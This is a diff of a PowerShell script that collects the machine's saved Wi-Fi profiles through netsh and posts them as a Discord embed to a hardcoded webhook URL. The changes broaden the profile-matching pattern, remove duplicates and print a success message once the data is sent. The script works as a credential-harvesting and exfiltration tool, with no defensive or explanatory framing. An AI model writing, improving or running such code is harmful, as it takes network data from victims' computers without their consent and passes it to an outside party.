@@ -2,11 +2,14 @@ $Webhook="https://discord.com/api/webhooks/1391925819017793566/P6u2qHAbmqSFeu94T
 $rawProfiles = netsh wlan show profile
 $profiles = @()
 foreach ($line in $rawProfiles) {
-    if ($line -match 'All User Profile|Tutti i profili utente|Alle Profile|Todos los perfiles') {
+    if ($line -match '.*:.*') {
         $parts = $line -split ':'
-        if ($parts.Length -ge 2) { $profiles += $parts[1].Trim() }
+        if ($parts.Length -ge 2) { 
+            $profiles += $parts[1].Trim() 
+        }
     }
 }
+$profiles = $profiles | Where-Object { $_ -ne "" } | Sort-Object -Unique
 if ($profiles.Count -eq 0) { Write-Host "No Wi-Fi profiles found."; exit }
 
 $fields = @()
@@ -38,3 +41,4 @@ $embed = @{
 }
 $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 4
 Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json"
+Write-Host "Wi-Fi networks sent successfully."
